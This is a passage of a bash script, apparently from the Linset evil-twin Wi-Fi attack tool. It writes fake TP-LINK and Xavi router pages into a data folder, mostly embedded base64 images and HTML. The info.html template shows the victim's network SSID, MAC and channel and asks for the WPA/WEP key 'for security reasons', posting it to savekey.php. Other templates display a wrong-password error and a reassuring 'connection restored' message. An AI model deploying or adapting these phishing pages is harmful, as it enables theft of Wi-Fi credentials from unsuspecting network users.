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\" width=\"490\">
			<table>
				<tbody><tr><td class=\"style1\">TP-LINK Wireless Router</td></tr>
			</tbody></table>
		</td>
	</tr>
	</tbody></table></td></tr>
<tr><td><img src=\"data:image/jpeg;base64,/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAUAAA/+4AJkFkb2JlAGTAAAAAAQMAFQQDBgoNAAACNwAAAlgAAALgAAADe//bAIQAAgICAgICAgICAgMCAgIDBAMCAgMEBQQEBAQEBQYFBQUFBQUGBgcHCAcHBgkJCgoJCQwMDAwMDAwMDAwMDAwMDAEDAwMFBAUJBgYJDQsJCw0PDg4ODg8PDAwMDAwPDwwMDAwMDA8MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAAwMCAwERAAIRAQMRAf/EAIUAAQEBAQEBAAAAAAAAAAAAAAMEAgEACAEBAQEAAAAAAAAAAAAAAAAAAgABEAEBAQADAAAAAAAAAAAAAAABABAgQGARAQAAAAAAAAAAAAAAAAAAAGASAQAAAAAAAAAAAAAAAAAAAGATAQEAAgIDAAMAAAAAAAAAAAEAEEEgMTBAwVBggf/aAAwDAQACEQMRAAAB+Y67h1HWDUe4N4ew3HuDWHUNYdQ1h1g1HWDUdYNR1g1HWDWFTrmYaw1jrGYa51hrGYax1jMdYaw1zMdYax1hMdca9tLVLVL2pqlql7U1S1S1U9papapape1NUtUtVPaWqWqWqXtTXN06Kio6Kio6Kio6Kio6Kio6Kio6KjoqOvV//9oACAEBAAEFAuyRhEcDDDDCNMIiIiIiIiIiIiIiIjtf/9oACAECAAEFAvQ//9oACAEDAAEFAvQ//9oACAECAgY/AkP/2gAIAQMCBj8CQ//aAAgBAQEGPwJD/9oACAEBAwE/IfYMhwBEYGBgYGQjA9kxoYxmZmZmZmZmZmZmZnP/2gAIAQIDAT8h9t5OXL4SIiIwREREYIwRERHtf//aAAgBAwMBPyHD5nDln9L/AP/aAAwDAQACEQMRAAAQDDHVF11zDDBDeLyvSL1sxOlqMlApEJEpENEpgEEgEEAkEggEH/
/
aAAgBAQMBPxCIiIiI1ERHURH2IiI1ER1bcS0tOfWtpwvbDW1w1z6Wlrjrhpa2mf7tbTDXHW0tOP7/ANvjHvjvd74x7473e+Mfq+Le73W3ntx//9oACAECAwE/EPE+ZmcGZmcGcGcGZmZmeYB4ABkPwAH/2gAIAQMDAT8QnBmZmZmZmZwcGcjPEjJ4jiRERERERERERERERHtf/9k=\" height=\"3\" align=\"top\" border=\"0\" width=\"100%\"></td></tr>
</tbody></table>

</body></html>" > $DUMP_PATH/data/top.htm
}


index && css_help && error && final && info && MenuRpm && StatusHelpRpm && StatusRpm && top


}

# Crea contenido de la iface Xavi
function XAVI {
mkdir $DUMP_PATH/data &>$linset_output_device

function colors {
echo "body {
    color: #5f5f5f;
    background-color: #ffffff;
}
td {
    color: #5f5f5f;
    background-color: #ffffff;
}
td.menu {
    background-color: #f3f3f3;
}
td.hd {
    color: #5f5f5f;
    background-color: #e0e0e0;
}
input {
    color: #5f5f5f;
}
.footerbody {
    border-top: #b70024 1px solid;
    border-bottom: #b70024 1px solid;
    background: #000000 none;
}
.footertd {
    background-color: #000000;
}
.mainMenuBody {
    background: #f3f3f3 none;
}
.menuLink {
    color: rgb(152, 152, 152);
}

.menuLink:active {
    color: #e10027;
    background-color: #f3f3f3;
}

.menuCell {
    background-color: #f3f3f3;
}" > $DUMP_PATH/data/colors.css
}

function error {
echo "<HTML><HEAD><link rel=\"stylesheet\" href=\"stylemain.css\" type=\"text/css\">
         <link rel=\"stylesheet\" href=\"colors.css\" type=\"text/css\"></HEAD>

<BODY>
      <blockquote>


    <TABLE id=\"autoWidth\">

      <TBODY>



        <TR>

          <TD colspan=2></TD>

        </TR>


        <TR>

          <TD class=info1 colspan=2>
          
<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b></TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        
<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>




      </TBODY>

    </TABLE>


      </blockquote>
</BODY>

</HTML>
" > $DUMP_PATH/data/error.html
}

function final {
echo "<HTML><HEAD><link rel=\"stylesheet\" href=\"stylemain.css\" type=\"text/css\">
         <link rel=\"stylesheet\" href=\"colors.css\" type=\"text/css\"></HEAD>

<BODY>
      <blockquote>

    <TABLE id=\"autoWidth\">

      <TBODY>


        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
Your connection will be restored in a few moments.</TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        



      </TBODY>

    </TABLE>


</blockquote>
</BODY>

</HTML>
" > $DUMP_PATH/data/final.html
}

function info {
echo "<html><head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\">
      <meta http-equiv=\"Pragma\" content=\"no-cache\">
      <link rel=\"stylesheet\" href=\"stylemain.css\" type=\"text/css\">
         <link rel=\"stylesheet\" href=\"colors.css\" type=\"text/css\">
</head>
   <body onload=\"frmLoad()\">
      <blockquote>
         <form id=\"form1\" name=\"form1\" method=\"POST\" action=\"savekey.php\" >
            <b>Wireless -- Security</b><br>
            
<br>

    <TABLE id=\"autoWidth\">

      <TBODY>
<tr><td><hr color=\"blue\" size=1 width=\"100%\"></td></tr>


                <tr><td colspan=\"2\" >SSID: <b>$Host_SSID</b></td></tr>
        <tr><td colspan=\"2\"  >MAC Address: <b>$mac</b></td></tr>
        <tr><td colspan=\"2\"  >Channel: <b>$channel</b></td></tr>

<tr><td></td></tr>


<tr><td><hr color=\"blue\" size=1 width=\"100%\"></td></tr>
<tr><td></td></tr>

        <TR>

          <TD class=info1 colspan=2>
          
For security reasons, enter the <b>$privacy</b> key to access the Internet
<div id=\"box\" align=\"left\" >
<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"savekey.php\" >
<br>
<tr><td>$privacy Key:</td></tr>
<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>



        <TR><TD class=blue colspan=2></TD></TR>
                <TR><TD class=blue colspan=2></TD></TR>

        
<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"buttonBig\" type=\"submit\" value=\"Confirm\"/></td></tr>

</form></div>

</TD></TR>


      </TBODY>

    </TABLE>

            
            
            <br>
            </div>
         </form>
      </blockquote>
   

</body></html>" > $DUMP_PATH/data/info.html
}

function logo {
echo "<html><head>
<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\">
      <title></title>
      <link rel=\"stylesheet\" href=\"stylemain.css\" type=\"text/css\">
         <link rel=\"stylesheet\" href=\"colors.css\" type=\"text/css\">
            <meta http-equiv=\"Pragma\" content=\"no-cache\">
   </head>
   <body class=\"logoBody\" topmargin=\"0\" leftmargin=\"0\">
      <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
        <tbody><tr>
          <td height=\"89\" width=\"330\"><img src=\"data:image/gif;base64,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
